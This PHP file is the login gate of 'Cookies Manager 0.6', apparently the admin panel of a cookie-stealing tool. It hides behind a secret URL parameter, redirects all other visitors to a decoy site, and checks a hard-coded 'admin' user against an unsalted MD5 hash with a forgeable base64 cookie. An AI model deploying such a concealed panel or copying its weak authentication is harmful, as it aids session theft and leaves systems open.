<?php

// Cookies Manager 0.6
// (C) Doddy Hackman 2015

// Login

$username = "admin"; // Edit
$password = "21232f297a57a5a743894a0e4a801fc3"; // Edit

//

$index = "imagen.php"; // Edit

if (isset($_GET['poraca'])) {
    
    echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
      <title>Login</title>
      <link rel="shortcut icon" href="images/icono.png">
      <link href="style.css" rel="stylesheet" type="text/css" />
   </head>
   <body>
      <center><br>
         <div class="post">
            <h3>Login</h3>
            <div class="post_body">
               <img src="images/login.jpg" width="562" height="440" />
               <br />
               <form action="" method=POST>
                  Username : <input type=text size=30 name=username /><br /><br />
                  Password : <input type=password size=30 name=password /><br /><br />
                  <input type=submit name=login style="width: 100px;" value=Login /><br /><br />
               </form>
            </div>
         </div>
      </center>
   </body>
</html>';
    
    if (isset($_POST['login'])) {
        
        $test_username = $_POST['username'];
        $test_password = md5($_POST['password']);
        
        if ($test_username == $username && $test_password == $password) {
            setcookie("login", base64_encode($test_username . "@" . $test_password));
            echo "<script>alert('Welcome idiot');</script>";
            $ruta = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . "/" . $index;
            echo '<meta http-equiv="refresh" content="0; url=' . htmlentities($ruta) . '" />';
        } else {
            echo "<script>alert('Fuck You');</script>";
        }
    }
    
} else {
    echo '<meta http-equiv="refresh" content="0; url=http://www.petardas.com" />';
}

// The End ?

?>